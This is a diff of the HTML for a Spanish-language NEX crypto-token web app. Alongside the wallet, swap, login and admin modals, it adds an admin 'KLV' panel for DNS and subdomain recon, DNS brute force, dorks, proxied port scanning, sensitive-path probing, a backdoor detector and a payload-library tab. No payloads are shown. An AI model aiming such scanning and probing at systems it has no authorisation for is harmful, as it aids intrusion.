-                        allowfullscreen>
-                    </iframe>
+            <div id="realTradeSection" style="margin-top:15px;display:block;">
+                <button class="btn-action web3-btn" style="background:#1fc7d4;color:#fff;border:none;font-weight:bold;" onclick="abrirModalCanjear()">🔄 Canjear / Comprar NEX</button>
+                <button class="btn-action btn-send" onclick="abrirModalEnviarTokens()">📤 Enviar Tokens a Otra Billetera</button>
+                <button class="btn-action web3-btn" style="background:#f3ba2f;color:#000;border:none;font-weight:bold;" onclick="abrirWalletChoiceModal()">🦊 Conectar con MetaMask o Trust Wallet</button>
+            </div>
+            <div style="margin-top:25px;border-top:1px solid var(--border-color);padding-top:15px;">
+                <div style="display:flex;justify-content:space-between;align-items:center;">
+                    <h4 style="color:var(--text-main);font-size:14px;">📜 Historial en cadena real</h4>
+                    <button class="btn-gen" style="padding:4px 8px;" onclick="toggleHistorial()">Mostrar / Ocultar</button>
+                </div>
+                <div id="historialLista" style="display:none;margin-top:10px;font-size:13px;max-height:250px;overflow-y:auto;">
+                    <p style="color:var(--text-muted);text-align:center;">Conecta tu billetera para cargar transacciones reales.</p>
                 </div>
             </div>
         </div>
 
-        <div id="bannerMiddleContainer" class="dynamic-banner"><img id="bannerMiddleImg" src=""></div>
-        <div id="bannerBottomContainer" class="dynamic-banner"><img id="bannerBottomImg" src=""></div>
+        <div class="card">
+            <h2>Token Mercado NEX ($NEX)</h2>
+            <h1 id="tokenPrice" style="font-size:2.2rem;margin-top:10px;">Cargando...</h1>
+            <p style="font-size:13px;color:var(--text-muted);margin-top:5px;">Rojo: <strong id="tokenNet" style="color:#38bdf8;">BNB Smart Chain (Mainnet)</strong></p>
+            <div class="chart-container">
+                <iframe id="geckoterminal-embed" title="Gráfico NEX de GeckoTerminal" src="https://www.geckoterminal.com/bsc/tokens/0x44B1c3Cd218D73368AD865C1cf8bd6E1Dd15c59A?embed=1&info=0&swaps=0&grayscale=0&light_chart=0" allow="clipboard-write" allowfullscreen></iframe>
+            </div>
+        </div>
     </div>
 
-    <!-- MODAL CANJEAR CON SALDO Y CALCULADORA -->
-    <div id="modalCanjear" class="modal">
-        <div class="modal-content">
-            <h3 style="color: var(--primary-cyan);">🔄 Canjear por NEX</h3>
-            <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 12px;">Compra NEX directamente usando el saldo en tu billetera conectada.</p>
-            
+    <div id="bannerMiddleContainer" class="dynamic-banner"><img id="bannerMiddleImg" src=""></div>
+    <div id="bannerBottomContainer" class="dynamic-banner"><img id="bannerBottomImg" src=""></div>
+</div>
+
+<div id="modalCanjear" class="modal">
+    <div class="modal-content">
+        <h3 style="color:var(--primary-cyan);">🔄 Canjear por NEX</h3>
+        <p style="font-size:12px;color:var(--text-muted);margin-bottom:12px;">Compra NEX directamente usando el saldo en tu billetera conectada.</p>
+        <div class="field">
+            <div style="display:flex;justify-content:space-between;align-items:flex-end;">
+                <label>Quiero pagar usando:</label>
+                <span id="swapUserBalance" style="font-size:11px;color:var(--primary-gold);font-weight:bold;margin-bottom:4px;">Saldo: Cargando...</span>
+            </div>
+            <select id="swapCurrency" onchange="window.actualizarSaldosSwap(); window.calcularRecepcionNEX();">
+                <option value="BNB">BNB (Moneda Principal)</option>
+                <option value="USDT">USDT (Tether BEP-20)</option>
+            </select>
+        </div>
+        <div class="field">
+            <label>Cantidad a gastar:</label>
+            <input type="number" id="swapAmountIn" placeholder="Ej. 0.05" oninput="window.calcularRecepcionNEX();">
+            <div id="swapExpectedOut" style="font-size:13px;color:var(--green-up);margin-top:6px;font-weight:bold;">Ingresa una cantidad para cotizar.</div>
+        </div>
+        <button class="btn-auth" style="width:100%;margin-top:10px;background:#1fc7d4;color:#fff;font-size:14px;" onclick="ejecutarSwapWeb3()">✅ Confirmar y Comprar</button>
+        <button class="btn-gen" style="width:100%;margin-top:10px;border:none;" onclick="cerrarModal('modalCanjear')">Cancelar</button>
+    </div>
+</div>
+
+<div id="sendTokensModal" class="modal">
+    <div class="modal-content">
+        <h3 style="color:var(--primary-gold);">📤 Enviar NEX Real (Red BNB)</h3>
+        <p style="font-size:12px;color:var(--text-muted);margin-bottom:12px;">Transfiere tokens directamente en la cadena de bloques BSC.</p>
+        <div class="field"><label>Dirección de Destino (0x...)</label><input type="text" id="sendDestinationAddress" placeholder="0xDireccionDeBilletera"></div>
+        <div class="field"><label>Cantidad de Tokens NEX a Enviar</label><input type="number" id="sendTokenAmount" placeholder="Ej. 50"></div>
+        <button class="btn-auth" style="width:100%;margin-top:10px;background:#f59e0b;color:#000;" onclick="ejecutarEnvioTokensWeb3()">Confirmar y Enviar</button>
+        <button class="btn-gen" style="width:100%;margin-top:10px;border:none;" onclick="cerrarModal('sendTokensModal')">Cancelar</button>
+    </div>
+</div>
+
+<div id="walletChoiceModal" class="modal">
+    <div class="modal-content" style="text-align:center;">
+        <h3>Conecta tu Billetera</h3>
+        <p style="font-size:13px;color:var(--text-muted);margin-bottom:15px;">Selecciona tu billetera para vincular y sincronizar tus tokens NEX:</p>
+        <button class="wallet-option-btn btn-metamask-choice" onclick="vincularTokenWeb3('metamask')">🦊 MetaMask</button>
+        <button class="wallet-option-btn btn-trust-choice" onclick="vincularTokenWeb3('trustwallet')">🛡️ Trust Wallet</button>
+        <button class="btn-gen" style="width:100%;margin-top:15px;border:none;" onclick="cerrarModal('walletChoiceModal')">Cancelar</button>
+    </div>
+</div>
+
+<div id="adminAuthModal" class="modal">
+    <div class="modal-content">
+        <h3>Acceso Administrativo</h3>
+        <div class="field"><label>Usuario</label><input type="text" id="adminUserInput" placeholder="Escribe tu usuario"></div>
+        <div class="field"><label>Contraseña</label><input type="password" id="adminPassInput" placeholder="Escribe tu contraseña"></div>
+        <button class="btn-auth" style="width:100%;margin-top:10px;" onclick="validarCredencialesAdmin()">Ingresar a Panel</button>
+        <button class="btn-gen" style="width:100%;margin-top:10px;border:none;" onclick="cerrarModal('adminAuthModal')">Cancelar</button>
+    </div>
+</div>
+
+<div id="authModal" class="modal">
+    <div class="modal-content">
+        <h3 id="modalTitle">Acceso de Usuario</h3>
+        <button class="btn-provider btn-google" id="btnGoogleModal" onclick="ejecutarLoginGoogle()">Continuar con Google</button>
+        <button class="btn-provider btn-apple" id="btnAppleModal" onclick="ejecutarLoginApple()">Continuar con Apple</button>
+        <div style="margin:15px 0;color:var(--text-muted);font-size:12px;text-align:center;">- O CORREO -</div>
+        <div class="field"><label>Correo Electrónico</label><input type="email" id="authEmail" placeholder="tu@correo.com"></div>
+        <div style="display:flex;gap:10px;margin-top:15px;"><button class="btn-auth" style="flex:1;" onclick="enviarCodigoEmail()">Enviar Enlace de Acceso</button></div>
+        <button class="btn-gen" style="width:100%;margin-top:10px;border:none;" onclick="cerrarAuthModal()">Cancelar</button>
+    </div>
+</div>
+
+<div id="helpModal" class="modal">
+    <div class="modal-content">
+        <h3>Soporte en Vivo</h3>
+        <div id="userChatBox" class="chat-box"></div>
+        <div class="chat-input-container">
+            <input type="text" id="userChatMessage" placeholder="Escribe aquí...">
+            <button class="btn-auth" onclick="enviarMensajeSoporte()">Enviar</button>
+        </div>
+        <button class="btn-gen" style="width:100%;margin-top:10px;border:none;" onclick="cerrarHelpModal()">Cerrar</button>
+    </div>
+</div>
+
+<div id="adminModal" class="modal">
+    <div class="modal-content" style="max-width:600px;">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+            <h3>Centro de Comando NEX</h3>
+            <span style="font-size:12px;color:var(--primary-cyan);">Visitas Totales: <b id="adminVisitasCount">0</b></span>
+        </div>
+        <div class="admin-tabs">
+            <button class="tab-btn active" onclick="cambiarPestanaAdmin('tabMercado', this)">💰 Mercado</button>
+            <button class="tab-btn" onclick="cambiarPestanaAdmin('tabDiseno', this)">🎨 Diseño</button>
+            <button class="tab-btn" onclick="cambiarPestanaAdmin('tabUsuarios', this)">👥 Usuarios & Seguridad</button>
+            <button class="tab-btn" onclick="cambiarPestanaAdmin('tabChat', this)">💬 Chat</button>
+            <button class="tab-btn klv" onclick="cambiarPestanaAdmin('tabKLV', this)">🛰️ KLV Avanzado</button>
+        </div>
+
+        <div id="tabMercado" class="tab-content active">
+            <h4 style="color:var(--primary-gold);margin-bottom:10px;">Estado del Proyecto</h4>
             <div class="field">
-                <div style="display: flex; justify-content: space-between; align-items: flex-end;">
-                    <label>Quiero pagar usando:</label>
-                    <span id="swapUserBalance" style="font-size: 11px; color: var(--primary-gold); font-weight: bold; margin-bottom: 4px;">Saldo: Cargando...</span>
-                </div>
-                <!-- Al cambiar de moneda, actualiza el saldo y recalcula los NEX -->
-                <select id="swapCurrency" onchange="window.actualizarSaldosSwap(); window.calcularRecepcionNEX();">
-                    <option value="BNB">BNB (Moneda Principal)</option>
-                    <option value="USDT">USDT (Tether BEP-20)</option>
+                <label>Modo Web3 vs Simulación</label>
+                <select id="adminRealMode">
+                    <option value="false">Modo Simulación (Pruebas Internas)</option>
+                    <option value="true">MODO REAL (Conexión PancakeSwap / BNB)</option>
                 </select>
             </div>
-            
             <div class="field">
-                <label>Cantidad a gastar:</label>
-                <!-- Al escribir, calcula los NEX en vivo -->
-                <input type="number" id="swapAmountIn" placeholder="Ej. 0.05" oninput="window.calcularRecepcionNEX();">
-                <div id="swapExpectedOut" style="font-size: 13px; color: var(--green-up); margin-top: 6px; font-weight: bold;">Recibirás aprox: 0.00 NEX</div>
+                <label>Habilitar Comercio (Activar Compra/Venta)</label>
+                <select id="adminTradingMode">
+                    <option value="yes">Activado (Los usuarios pueden operar)</option>
+                    <option value="no">Desactivado (Botones ocultos)</option>
+                </select>
             </div>
-
-            <button class="btn-auth" style="width:100%; margin-top:10px; background: #1fc7d4; color: white; font-size: 14px;" onclick="ejecutarSwapWeb3()">✅ Confirmar y Comprar</button>
-            <button class="btn-gen" style="width:100%; margin-top:10px; border:none;" onclick="cerrarModal('modalCanjear')">Cancelar</button>
+            <hr style="border-color:var(--border-color);margin:15px 0;">
+            <p style="font-size:12px;color:var(--text-muted);">El precio de la moneda se calcula y se actualiza de forma automática y autónoma directamente desde la red BNB Chain (PancakeSwap).</p>
         </div>
-    </div>
 
-    <div id="sendTokensModal" class="modal">
-        <div class="modal-content">
-            <h3 style="color: var(--primary-gold);">📤 Enviar NEX Real (Red BNB)</h3>
-            <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 12px;">Transfiere tokens directamente en la cadena de bloques BSC.</p>
-            <div class="field">
-                <label>Dirección de Destino (0x...)</label>
-                <input type="text" id="sendDestinationAddress" placeholder="0xDireccionDeBilletera">
+        <div id="tabDiseno" class="tab-content">
+            <h4 style="color:var(--primary-cyan);margin-bottom:10px;">Colores de la Web</h4>
+            <div class="field"><label>Color Principal de Botones / Acentos</label><input type="color" id="adminColorMain" value="#38bdf8" style="height:40px;"></div>
+            <hr style="border-color:var(--border-color);margin:15px 0;">
+            <h4 style="color:var(--primary-cyan);margin-bottom:10px;">Banner Publicitario</h4>
+            <div class="field"><label>URL de Foto</label><input type="text" id="adminImageUrl" placeholder="https://..."></div>
+            <div class="field"><label>Texto Encima de Foto</label><input type="text" id="adminBannerText"></div>
+            <div class="field"><label>Color de Letras</label><input type="color" id="adminBannerColor" value="#ffffff" style="height:40px;"></div>
+            <div class="field"><label>Mover Texto (Marquesina)</label>
+                <select id="adminBannerMove"><option value="no">Fijo</option><option value="yes">Animado</option></select>
             </div>
-            <div class="field">
-                <label>Cantidad de Tokens NEX a Enviar</label>
-                <input type="number" id="sendTokenAmount" placeholder="Ej. 50">
-            </div>
-            <button class="btn-auth" style="width:100%; margin-top:10px; background: #f59e0b; color: #000;" onclick="ejecutarEnvioTokensWeb3()">Confirmar y Enviar</button>
-            <button class="btn-gen" style="width:100%; margin-top:10px; border:none;" onclick="cerrarModal('sendTokensModal')">Cancelar</button>
-        </div>
-    </div>
-
-    <div id="walletChoiceModal" class="modal">
-        <div class="modal-content" style="text-align: center;">
-            <h3>Conecta tu Billetera</h3>
-            <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 15px;">Selecciona tu billetera para vincular y sincronizar tus tokens NEX:</p>
-            
-            <button class="wallet-option-btn btn-metamask-choice" onclick="vincularTokenWeb3('metamask')">
-                🦊 MetaMask
-            </button>
-            <button class="wallet-option-btn btn-trust-choice" onclick="vincularTokenWeb3('trustwallet')">
-                🛡️ Trust Wallet
-            </button>
-            
-            <button class="btn-gen" style="width:100%; margin-top:15px; border:none;" onclick="cerrarModal('walletChoiceModal')">Cancelar</button>
-        </div>
-    </div>
-
-    <div id="adminAuthModal" class="modal">
-        <div class="modal-content">
-            <h3>Acceso Administrativo</h3>
-            <div class="field"><label>Usuario</label><input type="text" id="adminUserInput" placeholder="Escribe tu usuario"></div>
-            <div class="field"><label>Contraseña</label><input type="password" id="adminPassInput" placeholder="Escribe tu contraseña"></div>
-            <button class="btn-auth" style="width:100%; margin-top:10px;" onclick="validarCredencialesAdmin()">Ingresar a Panel</button>
-            <button class="btn-gen" style="width:100%; margin-top:10px; border:none;" onclick="cerrarModal('adminAuthModal')">Cancelar</button>
-        </div>
-    </div>
-
-    <div id="authModal" class="modal">
-        <div class="modal-content">
-            <h3 id="modalTitle">Acceso de Usuario</h3>
-            <button class="btn-provider btn-google" id="btnGoogleModal" onclick="ejecutarLoginGoogle()">Continuar con Google</button>
-            <button class="btn-provider btn-apple" id="btnAppleModal" onclick="ejecutarLoginApple()">Continuar con Apple</button>
-            <div style="margin: 15px 0; color: var(--text-muted); font-size: 12px; text-align: center;">- O CORREO -</div>
-            <div class="field"><label>Correo Electrónico</label><input type="email" id="authEmail" placeholder="tu@correo.com"></div>
-            
-            <div style="display: flex; gap: 10px; margin-top: 15px;">
-                <button class="btn-auth" style="flex:1;" onclick="enviarCodigoEmail()">Enviar Enlace de Acceso</button>
-            </div>
-            <button class="btn-gen" style="width:100%; margin-top:10px; border:none;" onclick="cerrarAuthModal()">Cancelar</button>
-        </div>
-    </div>
-
-    <div id="helpModal" class="modal">
-        <div class="modal-content">
-            <h3>Soporte en Vivo</h3>
-            <div id="userChatBox" class="chat-box"></div>
-            <div class="chat-input-container">
-                <input type="text" id="userChatMessage" placeholder="Escribe aquí...">
-                <button class="btn-auth" onclick="enviarMensajeSoporte()">Enviar</button>
-            </div>
-            <button class="btn-gen" style="width:100%; margin-top:10px; border:none;" onclick="cerrarHelpModal()">Cerrar</button>
-        </div>
-    </div>
-
-    <!-- PANEL ADMINISTRATIVO -->
-    <div id="adminModal" class="modal">
-        <div class="modal-content" style="max-width: 600px;">
-            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
-                <h3>Centro de Comando NEX</h3>
-                <span style="font-size: 12px; color: var(--primary-cyan);">Visitas Totales: <b id="adminVisitasCount">0</b></span>
-            </div>
-            
-            <div class="admin-tabs">
-                <button class="tab-btn active" onclick="cambiarPestañaAdmin('tabMercado', this)">💰 Mercado</button>
-                <button class="tab-btn" onclick="cambiarPestañaAdmin('tabDiseno', this)">🎨 Diseño</button>
-                <button class="tab-btn" onclick="cambiarPestañaAdmin('tabUsuarios', this)">👥 Usuarios & Seguridad</button>
-                <button class="tab-btn" onclick="cambiarPestañaAdmin('tabChat', this)">💬 Chat</button>
-            </div>
-
-            <div id="tabMercado" class="tab-content active">
-                <h4 style="color: var(--primary-gold); margin-bottom: 10px;">Estado del Proyecto</h4>
-                <div class="field">
-                    <label>Modo Web3 vs Simulación</label>
-                    <select id="adminRealMode">
-                        <option value="false">Modo Simulación (Pruebas Internas)</option>
-                        <option value="true">MODO REAL (Conexión PancakeSwap / BNB)</option>
-                    </select>
-                </div>
-                <div class="field">
-                    <label>Habilitar Comercio (Activar Compra/Venta)</label>
-                    <select id="adminTradingMode">
-                        <option value="yes">Activado (Los usuarios pueden operar)</option>
-                        <option value="no">Desactivado (Botones ocultos)</option>
-                    </select>
-                </div>
-                <hr style="border-color: var(--border-color); margin: 15px 0;">
-                <p style="font-size: 12px; color: var(--text-muted);">El precio de la moneda se calcula y se actualiza de forma automática y autónoma directamente desde la red BNB Chain (PancakeSwap).</p>
-            </div>
-
-            <div id="tabDiseno" class="tab-content">
-                <h4 style="color: var(--primary-cyan); margin-bottom: 10px;">Colores de la Web</h4>
-                <div class="field">
-                    <label>Color Principal de Botones / Acentos</label>
-                    <input type="color" id="adminColorMain" value="#38bdf8" style="height: 40px;">
-                </div>
-                <hr style="border-color: var(--border-color); margin: 15px 0;">
-                <h4 style="color: var(--primary-cyan); margin-bottom: 10px;">Banner Publicitario</h4>
-                <div class="field"><label>URL de Foto</label><input type="text" id="adminImageUrl" placeholder="https://..."></div>
-                <div class="field"><label>Texto Encima de Foto</label><input type="text" id="adminBannerText"></div>
-                <div class="field"><label>Color de Letras</label><input type="color" id="adminBannerColor" value="#ffffff" style="height: 40px;"></div>
-                <div class="field"><label>Mover Texto (Marquesina)</label>
-                    <select id="adminBannerMove"><option value="no">Fijo</option><option value="yes">Animado</option></select>
-                </div>
-                <div class="field"><label>Posición</label>
-                    <select id="adminImagePosition">
-                        <option value="none">Oculto</option>
-                        <option value="top">Arriba</option>
-                        <option value="middle">Medio</option>
-                        <option value="bottom">Abajo</option>
-                    </select>
-                </div>
-            </div>
-
-            <div id="tabUsuarios" class="tab-content">
-                <div style="margin-bottom: 15px;">
-                    <h4 style="color: var(--primary-cyan); margin-bottom: 8px;">👀 Registro de Entradas (Gente que va entrando)</h4>
-                    <div id="listaVisitasAdmin" style="max-height: 120px; overflow-y: auto; background: var(--bg-dark); padding: 8px; border-radius: 6px; border: 1px solid var(--border-color);">
-                        <p style="color:var(--text-muted); font-size:11px;">Cargando lista de visitas...</p>
-                    </div>
-                </div>
-
-                <div>
-                    <h4 style="color: var(--primary-gold); margin-bottom: 8px;">👥 Personas Registradas (Usuarios Nuevos)</h4>
-                    <p style="font-size: 11px; color: var(--text-muted); margin-bottom: 10px;">Lista de personas unidas con correo, Google o Apple. Usa el botón al lado para expulsar al que haga algo mal.</p>
-                    <div id="listaUsuariosAdmin" style="max-height: 200px; overflow-y: auto;">
-                    </div>
-                </div>
-            </div>
-
-            <div id="tabChat" class="tab-content">
-                <div id="adminChatListContainer">
-                    <h4 style="color: var(--primary-cyan); margin-bottom: 10px;">Mensajes de Usuarios</h4>
-                    <div id="adminChatUsersList" style="max-height: 300px; overflow-y: auto; display: flex; flex-direction: column; gap: 8px;">
-                        <p style="color:var(--text-muted); font-size: 12px;">Cargando chats...</p>
-                    </div>
-                </div>
-                
-                <div id="adminChatActiveContainer" style="display: none;">
-                    <button class="btn-gen" style="margin-bottom: 10px; background: var(--border-color); color: white; border: none; padding: 6px 12px;" onclick="volverListaChatAdmin()">⬅ Volver a la lista</button>
-                    <h4 id="adminChatActiveTitle" style="color: var(--primary-gold); margin-bottom: 10px;">Chat con...</h4>
-                    <div id="adminChatBox" class="chat-box"></div>
-                    <div class="chat-input-container">
-                        <input type="text" id="adminReplyMessage" placeholder="Escribir respuesta...">
-                        <button class="btn-auth" onclick="enviarRespuestaAdmin()">Responder</button>
-                    </div>
-                </div>
-            </div>
-
-            <div style="display: flex; gap: 10px; margin-top: 20px;">
-                <button class="btn-auth" style="flex:1; background: var(--green-up); color: white;" onclick="guardarAjustesAdmin()">💾 Guardar Ajustes</button>
-                <button class="btn-gen" style="flex:1; background: var(--border-color); color: white;" onclick="cerrarAdminModal()">Cerrar</button>
+            <div class="field"><label>Posición</label>
+                <select id="adminImagePosition">
+                    <option value="none">Oculto</option><option value="top">Arriba</option>
+                    <option value="middle">Medio</option><option value="bottom">Abajo</option>
+                </select>
             </div>
         </div>
+
+        <div id="tabUsuarios" class="tab-content">
+            <div style="margin-bottom:15px;">
+                <h4 style="color:var(--primary-cyan);margin-bottom:8px;">👀 Registro de Entradas</h4>
+                <div id="listaVisitasAdmin" style="max-height:120px;overflow-y:auto;background:var(--bg-dark);padding:8px;border-radius:6px;border:1px solid var(--border-color);">
+                    <p style="color:var(--text-muted);font-size:11px;">Cargando lista de visitas...</p>
+                </div>
+            </div>
+            <div>
+                <h4 style="color:var(--primary-gold);margin-bottom:8px;">👥 Personas Registradas</h4>
+                <p style="font-size:11px;color:var(--text-muted);margin-bottom:10px;">Lista de personas unidas con correo, Google o Apple. Usa el botón al lado para expulsar al que haga algo mal.</p>
+                <div id="listaUsuariosAdmin" style="max-height:200px;overflow-y:auto;"></div>
+            </div>
+        </div>
+
+        <div id="tabChat" class="tab-content">
+            <div id="adminChatListContainer">
+                <h4 style="color:var(--primary-cyan);margin-bottom:10px;">Mensajes de Usuarios</h4>
+                <div id="adminChatUsersList" style="max-height:300px;overflow-y:auto;display:flex;flex-direction:column;gap:8px;">
+                    <p style="color:var(--text-muted);font-size:12px;">Cargando chats...</p>
+                </div>
+            </div>
+            <div id="adminChatActiveContainer" style="display:none;">
+                <button class="btn-gen" style="margin-bottom:10px;background:var(--border-color);color:#fff;border:none;padding:6px 12px;" onclick="volverListaChatAdmin()">⬅ Volver a la lista</button>
+                <h4 id="adminChatActiveTitle" style="color:var(--primary-gold);margin-bottom:10px;">Chat con...</h4>
+                <div id="adminChatBox" class="chat-box"></div>
+                <div class="chat-input-container">
+                    <input type="text" id="adminReplyMessage" placeholder="Escribir respuesta...">
+                    <button class="btn-auth" onclick="enviarRespuestaAdmin()">Responder</button>
+                </div>
+            </div>
+        </div>
+
+        <div id="tabKLV" class="tab-content">
+            <h4 style="color:#39ff88;margin-bottom:10px;">🛰️ MODO KLV AVANZADO</h4>
+            <p style="font-size:12px;color:var(--text-muted);margin-bottom:14px;">Consola de reconocimiento y auditoría. Se abre a pantalla completa, dentro de tu sesión de admin.</p>
+            <button class="klv-launch" onclick="klvAbrir()">⚡ MODO KLV AVANZADO</button>
+            <ul class="klv-list">
+                <li>DNS, subdominios, certificados, IP y geolocalización</li>
+                <li>Huella de headers y tecnología del servidor</li>
+                <li>Escáner de puertos y sondeo de rutas sensibles</li>
+                <li>Buscador de puertas traseras en código (PHP, JS, Python, .htaccess)</li>
+                <li>Codecs, hashes, JWT y librería de payloads</li>
+            </ul>
+        </div>
+
+        <div style="display:flex;gap:10px;margin-top:20px;">
+            <button class="btn-auth" style="flex:1;background:var(--green-up);color:#fff;" onclick="guardarAjustesAdmin()">💾 Guardar Ajustes</button>
+            <button class="btn-gen" style="flex:1;background:var(--border-color);color:#fff;" onclick="cerrarAdminModal()">Cerrar</button>
+        </div>
     </div>
+</div>
 
-    <div id="bannedScreen">
-        <h1>⛔ CUENTA SUSPENDIDA ⛔</h1>
-        <p>Has violado los términos de seguridad de NEX Token.</p>
-        <p>El acceso a este ecosistema ha sido revocado.</p>
-    </div>
+<div id="bannedScreen">
+    <h1>⛔ CUENTA SUSPENDIDA ⛔</h1>
+    <p>Ha violado los términos de seguridad de NEX Token.</p>
+    <p>El acceso a este ecosistema ha sido revocado.</p>
+</div>
 
-    <!-- FIREBASE & LÓGICA INTEGRADA REAL -->
-    <script type="module">
-      import { initializeApp } from "https://www.gstatic.com/firebasejs/12.19.0/firebase-app.js";
-      import { getAuth, sendSignInLinkToEmail, isSignInWithEmailLink, signInWithEmailLink, signOut, onAuthStateChanged, GoogleAuthProvider, OAuthProvider, signInWithPopup } from "https://www.gstatic.com/firebasejs/12.19.0/firebase-auth.js";
-      import { getFirestore, doc, setDoc, getDoc, onSnapshot, updateDoc, increment, collection, addDoc, query, orderBy, serverTimestamp, setLogLevel, limit } from "https://www.gstatic.com/firebasejs/12.19.0/firebase-firestore.js";
+<div id="klvPanel">
+  <div class="klv-top">
+    <b>MODO KLV AVANZADO</b><span class="klv-sub">recon · análisis · puertas traseras</span>
+    <span class="klv-blink"></span>
+    <button class="klv-x" onclick="klvCerrar()">✕ CERRAR</button>
+  </div>
+  <div class="klv-nav">
+    <button class="klv-tab on" data-k="recon">RECON</button>
+    <button class="klv-tab" data-k="codigo">ANÁLISIS DE CÓDIGO</button>
+    <button class="klv-tab" data-k="puertos">PUERTOS</button>
+    <button class="klv-tab" data-k="codec">CODEC / HASH</button>
+    <button class="klv-tab" data-k="pays">PAYLOADS</button>
+  </div>
+  <div class="klv-main">
+    <section class="klv-pane on" id="k-recon">
+      <div class="klv-card">
+        <h4>Objetivo</h4>
+        <div class="klv-row"><input id="k-target" placeholder="dominio.com" style="flex:1;min-width:200px"><button class="klv-b" onclick="klvRecon()">EJECUTAR</button></div>
+        <p class="klv-hint">DNS, IP y certificados son pasivos. Headers y puertos van por proxy público.</p>
+      </div>
+      <div class="klv-card">
+        <h4>Registros DNS</h4>
+        <div class="klv-row">
+          <select id="k-rtype" style="max-width:120px"><option>A</option><option>AAAA</option><option>MX</option><option>TXT</option><option>NS</option><option>CNAME</option><option>SOA</option></select>
+          <button class="klv-b g" onclick="klvDns()">CONSULTAR</button>
+        </div>
+        <pre class="klv-pre" id="k-dns">—</pre>
+      </div>
+      <div class="klv-card">
+        <h4>Subdominios</h4>
+        <div class="klv-row"><button class="klv-b g" onclick="klvCrt()">CERTIFICADOS (CRT.SH)</button><button class="klv-b g" onclick="klvBrute()">FUERZA BRUTA DNS</button></div>
+        <pre class="klv-pre" id="k-sub">—</pre>
+      </div>
+      <div class="klv-card">
+        <h4>IP / Geolocalización</h4>
+        <div class="klv-row"><button class="klv-b g" onclick="klvIp()">RESOLVER E INFO</button></div>
+        <pre class="klv-pre" id="k-ip">—</pre>
+      </div>
+      <div class="klv-card">
+        <h4>Headers / Tecnología</h4>
+        <div class="klv-row"><button class="klv-b g" onclick="klvHead()">TRAER</button><button class="klv-b g" onclick="klvHeadLink()">VER EN SECURITYHEADERS</button></div>
+        <pre class="klv-pre" id="k-head">—</pre>
+      </div>
+      <div class="klv-card">
+        <h4>Dorks</h4>
+        <div class="klv-row"><button class="klv-b g" onclick="klvDorks()">GENERAR</button></div>
+        <pre class="klv-pre" id="k-dork">—</pre>
+      </div>
+    </section>
 
-      setLogLevel('silent');
+    <section class="klv-pane" id="k-codigo">
+      <div class="klv-card">
+        <h4>Buscador de puertas traseras</h4>
+        <div class="klv-row" style="margin-bottom:9px">
+          <select id="k-lang" style="max-width:180px">
+            <option value="php">PHP</option><option value="js">JavaScript</option>
+            <option value="py">Python</option><option value="htaccess">.htaccess / servidor</option>
+            <option value="generic">Genérico</option>
+          </select>
+          <label class="klv-b g" style="display:inline-flex;align-items:center;cursor:pointer">SUBIR ARCHIVO<input type="file" id="k-file" style="display:none" onchange="klvLoadFile(event)"></label>
+          <button class="klv-b" onclick="klvAnalyze()">ANALIZAR</button>
+          <button class="klv-b g" onclick="klvClear()">LIMPIAR</button>
+        </div>
+        <textarea id="k-code" placeholder="Pega aquí el código a revisar…"></textarea>
+        <p class="klv-hint">Todo local. Detecta ejecución dinámica, ofuscación, webshells, persistencia y claves filtradas.</p>
+      </div>
+      <div class="klv-card" id="k-repcard" style="display:none">
+        <h4>Veredicto</h4>
+        <div class="klv-row" style="align-items:center;gap:20px">
+          <div><div class="klv-score" id="k-score">0</div><span class="klv-hint">riesgo /100</span></div>
+          <div style="flex:1">
+            <div id="k-verdict" style="font-weight:700;margin-bottom:6px"></div>
+            <span class="klv-stat">líneas <b id="k-lines">0</b></span>
+            <span class="klv-stat">críticos <b id="k-crit">0</b></span>
+            <span class="klv-stat">altos <b id="k-high">0</b></span>
+            <span class="klv-stat">medios <b id="k-med">0</b></span>
+            <span class="klv-stat">sha256 <b id="k-hash">—</b></span>
+          </div>
+        </div>
+      </div>
+      <div class="klv-card" id="k-findcard" style="display:none"><h4>Hallazgos</h4><div id="k-findings"></div></div>
+      <div class="klv-card" id="k-ioccard" style="display:none"><h4>Indicadores extraídos</h4><pre class="klv-pre" id="k-iocs">—</pre></div>
+      <div class="klv-card" id="k-deccard" style="display:none"><h4>Capas decodificadas</h4><pre class="klv-pre" id="k-dec">—</pre></div>
+    </section>
 
-      const firebaseConfig = { apiKey: "AIzaSyBJoAAzTcWn_K7gXydwwbesG_gERwBq8Us", authDomain: "nexk-131a4.firebaseapp.com", projectId: "nexk-131a4" };
-      const app = initializeApp(firebaseConfig);
-      const auth = getAuth(app);
-      const db = getFirestore(app);
-      
-      const googleProvider = new GoogleAuthProvider();
-      const appleProvider = new OAuthProvider('apple.com');
+    <section class="klv-pane" id="k-puertos">
+      <div class="klv-card">
+        <h4>Escáner</h4>
+        <div class="klv-row">
+          <input id="k-host" placeholder="host o IP" style="flex:1;min-width:180px">
+          <input id="k-ports" value="21,22,23,25,53,80,110,143,443,445,1433,2082,2083,3000,3306,3389,5432,6379,8000,8080,8443,8888,9000,27017" style="flex:1;min-width:220px">
+        </div>
+        <div class="klv-row" style="margin-top:8px"><button class="klv-b" onclick="klvScan()">ESCANEAR</button><button class="klv-b g" onclick="klvCommon()">LISTA COMÚN</button></div>
+        <p class="klv-warn">El navegador no abre sockets: se prueba por HTTP a través de proxy. Los puertos no web suelen salir cerrados aunque estén abiertos.</p>
+        <pre class="klv-pre" id="k-scan">—</pre>
+      </div>
+      <div class="klv-card">
+        <h4>Rutas típicas</h4>
+        <div class="klv-row"><button class="klv-b g" onclick="klvPaths()">SONDEAR</button></div>
+        <pre class="klv-pre" id="k-paths">—</pre>
+      </div>
+    </section>
 
-      // HACEMOS ESTAS VARIABLES GLOBALES DESDE EL INICIO PARA EVITAR EL ERROR
-      window.usuarioActual = null;
-      window.tokensActualesUsuario = 0;
-      window.PRECIO_TOKEN_USD = 0.01;
-      window.PRECIO_BNB_USD = 600; 
-      window.CAMBIO_24H_PORCENTAJE = 0;
-      window.walletDireccionConectada = null;
-      
-      let chatListenerUsuario = null;
-      let chatListenerAdmin = null;
-      let chatAdminUidActual = null;
+    <section class="klv-pane" id="k-codec">
+      <div class="klv-card">
+        <h4>Codificar / decodificar</h4>
+        <textarea id="k-cd" placeholder="texto o datos…" style="min-height:110px"></textarea>
